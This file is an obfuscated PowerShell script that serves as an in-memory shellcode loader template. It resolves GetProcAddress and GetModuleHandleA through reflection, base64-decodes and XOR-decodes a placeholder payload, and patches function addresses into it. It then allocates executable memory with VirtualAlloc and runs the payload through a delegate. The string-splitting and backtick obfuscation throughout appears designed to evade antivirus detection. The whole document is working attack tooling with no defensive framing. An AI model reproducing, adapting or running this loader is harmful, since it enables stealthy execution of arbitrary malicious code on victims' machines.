function fUnc_`GEt_pROC`_a`dD`RE`Ss {
	Param (${Va`R_`MODUle}, ${vaR_pRoC`e`DuRE})		
	${vAr_UnSAfE`_n`AT`Ive_`mETHoDS} = ([AppDomain]::"cURr`entdom`A`IN".("{1}{2}{0}"-f'es','Ge','tAssembli').Invoke() | W`HErE-`oBJECT { ${_}."GloBalA`s`S`EMblyc`AcHe" -And ${_}."LOCA`Ti`ON".("{0}{1}" -f'S','plit').Invoke('\\')[-1].("{0}{1}" -f'Eq','uals').Invoke(("{3}{0}{1}{2}"-f '.','d','ll','System')) }).("{1}{0}"-f 'Type','Get').Invoke(("{4}{5}{3}{1}{2}{0}{6}"-f't','32.U','nsafeNativeMe','t.Win','Microso','f','hods'))
	${VAr_`gPA} = ${VAR_`UNSAfe_n`A`T`IV`e`_methoDs}.("{2}{0}{1}" -f 'etho','d','GetM').Invoke(("{1}{3}{0}{2}"-f'r','Get','ess','ProcAdd'), [Type[]] @(("{0}{7}{3}{6}{1}{4}{2}{8}{5}"-f 'S','.','n','em.Runtim','I','dleRef','e','yst','teropServices.Han'), ("{0}{1}"-f 's','tring')))
	return ${vAR`_G`PA}."INVO`Ke"(${n`Ull}, @([System.Runtime.InteropServices.HandleRef](N`e`w-OBJEcT ('S'+'y'+'st'+'em.'+'Run'+'tim'+'e.Inte'+'ropSe'+'rv'+'ices.Ha'+'ndleRef')((neW-Ob`J`ecT ('IntP'+'t'+'r')), (${Var_u`NS`A`Fe`_nATive_meT`hods}.("{0}{2}{1}"-f 'G','Method','et').Invoke(("{3}{0}{1}{2}"-f'tMod','uleHand','le','Ge')))."In`V`oke"(${nu`lL}, @(${VA`R_MoD`UlE})))), ${V`Ar_prOc`EDURe}))
}

function F`Unc_g`eT`_`d`eL`egAte_tyPe {
	Param (
		[Parameter(pOsITIon = 0, mANdatorY = ${T`RuE})] [Type[]] ${var_paR`Am`et`ERS},
		[Parameter(pOsITIOn = 1)] [Type] ${va`R_`REtU`Rn_t`yPE} = [Void]
	)

	${VA`R_Ty`Pe_bUILD`eR} = [AppDomain]::"C`URReN`T`d`omAIn".("{1}{4}{2}{3}{0}{6}{5}" -f'ssem','De','Dynami','cA','fine','y','bl').Invoke((ne`w-OB`JEcT ('Sys'+'tem.'+'Re'+'f'+'lectio'+'n.'+'Assemb'+'lyName')(("{4}{0}{2}{1}{3}" -f 'f','ega','lectedDel','te','Re'))), [System.Reflection.Emit.AssemblyBuilderAccess]::"R`UN").("{2}{3}{1}{0}" -f 'dule','Mo','DefineDynami','c').Invoke(("{1}{3}{2}{0}"-f 'le','InMe','Modu','mory'), ${FA`lsE}).("{0}{1}{2}"-f 'Defin','e','Type').Invoke(("{2}{0}{1}{3}" -f'l','egateTy','MyDe','pe'), ("{2}{0}{5}{3}{1}{4}{7}{6}" -f 'lass, Pu',' S','C',',','ea','blic','Class','led, AnsiClass, Auto'), [System.MulticastDelegate])
	${VA`R_T`yP`e_bu`I`lDER}.("{0}{3}{5}{2}{4}{1}" -f'Defi','ctor','nstr','neC','u','o').Invoke(("{5}{2}{0}{4}{3}{1}" -f'ecial','HideBySig, Public','Sp','e, ','Nam','RT'), [System.Reflection.CallingConventions]::"s`TAn`DArd", ${Var_pa`R`AMETE`RS}).("{0}{4}{1}{3}{2}{5}{6}"-f 'SetIm','me','ionFl','ntat','ple','ag','s').Invoke(("{2}{0}{1}{3}" -f'e, M','ana','Runtim','ged'))
	${v`AR_t`YPe_bUi`lDER}.("{3}{1}{2}{0}"-f 'd','fineMet','ho','De').Invoke('Invoke', ("{1}{3}{7}{4}{0}{2}{5}{9}{8}{6}"-f'g','Publ',', NewS','ic, ','BySi','l','al','Hide','t, Virtu','o'), ${vAr_RE`T`UrN`_ty`pE}, ${vaR_pArA`mEt`Ers}).("{2}{5}{6}{0}{3}{1}{4}" -f'e','Flag','S','ntation','s','etImpl','em').Invoke(("{3}{0}{2}{1}" -f 'ntime, ','d','Manage','Ru'))

	return ${v`Ar_T`Y`Pe_BUILDER}.("{1}{0}{2}"-f'p','CreateTy','e').Invoke()
}

[Byte[]]${V`AR`_Co`de} = [System.Convert]::("{4}{2}{3}{0}{1}"-f'64S','tring','as','e','FromB').Invoke('%%DATA%%')

for (${X} = 0; ${X} -lt ${VAR`_CO`DE}."CO`UNT"; ${x}++) {
	${va`R_`C`odE}[${x}] = ${vAR_C`O`dE}[${x}] -bxor 42
}

[Byte[]]${fu`Nc_`GmH} = [BitConverter]::("{2}{0}{1}"-f 'yte','s','GetB').Invoke((Func_`GeT`_pR`OC_a`DdReSS ('ke'+'rne'+'l32') ('GetMo'+'dule'+'Hand'+'l'+'eA')).("{1}{0}" -f'2','ToInt3').Invoke())
[Byte[]]${fU`NC_`gPa} = [BitConverter]::("{1}{0}{2}" -f 'tBy','Ge','tes').Invoke((f`U`NC_GeT_prO`C_ADd`REsS ('kernel3'+'2') ('Ge'+'tPr'+'o'+'cAddress')).("{0}{1}"-f 'To','Int32').Invoke())
[Array]::("{0}{1}"-f 'Cop','y').Invoke(${fuNC`_G`MH}, 0, ${var`_C`ODE}, %%GMH_OFFSET%%, ${FU`NC`_GmH}."leN`GtH")
[Array]::("{0}{1}"-f 'Cop','y').Invoke(${FU`NC_`gPA}, 0, ${VaR`_C`ODe}, %%GPA_OFFSET%%, ${fU`N`C_gpa}."l`eNGth")

${vaR_`VA} = [System.Runtime.InteropServices.Marshal]::("{5}{6}{4}{2}{0}{3}{1}" -f 'Poi','r','ction','nte','Fun','GetDele','gateFor').Invoke((FUNC_Ge`T_p`Roc_Add`Re`ss ('kernel3'+'2.'+'dl'+'l') ('Vir'+'tualA'+'llo'+'c')), (F`UnC_GeT_`Delega`TE_`TypE @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
${VaR_`B`UfFer} = ${v`Ar_vA}."i`NV`Oke"([IntPtr]::"ze`RO", ${VaR`_`Code}."LE`NGTh", 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::("{0}{1}" -f'Cop','y').Invoke(${v`Ar`_`code}, 0, ${Va`R`_BUffER}, ${vAr_`C`ODe}."L`E`NGTH")

${VA`R_rUn`ME} = [System.Runtime.InteropServices.Marshal]::"GEtdELE`gA`Te`FoRF`U`NCTIOnP`o`inT`ER"(${var_`B`UF`Fer}, (f`Un`c_gET_dELEGaT`E_`T`YPe @([IntPtr]) ([Void])))
${VAr`_`RuNmE}."iN`VOke"([IntPtr]::"z`ERO")
